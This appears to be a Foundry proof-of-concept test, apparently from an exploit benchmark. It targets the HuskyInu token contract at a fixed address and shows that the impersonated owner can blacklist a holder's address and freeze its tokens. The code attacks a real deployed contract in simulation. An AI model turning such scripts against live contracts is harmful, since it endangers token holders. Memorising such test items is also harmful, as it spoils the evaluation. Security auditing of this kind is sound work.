// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IHuskyInu {
    function owner() external view returns (address);
    function addBlacklist(address b, bool enable) external;
    function blacklist(address) external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x40a5Ad300Ee5a5b8bA6B50719647C19F2E52d5BE;
    address attacker = address(this);
    address constant VICTIM_ADDRESS = address(0xDEADBEEF);

    IHuskyInu huskyInu = IHuskyInu(TARGET);
    address private owner;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract owner
        owner = huskyInu.owner();
        vm.label(owner, "Contract Owner");
        vm.label(VICTIM_ADDRESS, "Victim");

        // Precondition: A victim address must hold a non-zero balance of the HuskyInu token.
        deal(TARGET, VICTIM_ADDRESS, 1000 * 1e18);
        assertGt(huskyInu.balanceOf(VICTIM_ADDRESS), 0);

        // Precondition: The victim's address must not be on the blacklist prior to the exploit.
        assertEq(huskyInu.blacklist(VICTIM_ADDRESS), false);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Exploit: The owner adds the victim to the blacklist.
        vm.startPrank(owner);
        huskyInu.addBlacklist(VICTIM_ADDRESS, true);
        vm.stopPrank();

        // Oracle Verification: Check if the victim is now blacklisted.
        assertEq(huskyInu.blacklist(VICTIM_ADDRESS), true);
        assertEq(huskyInu.blacklist(VICTIM_ADDRESS), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
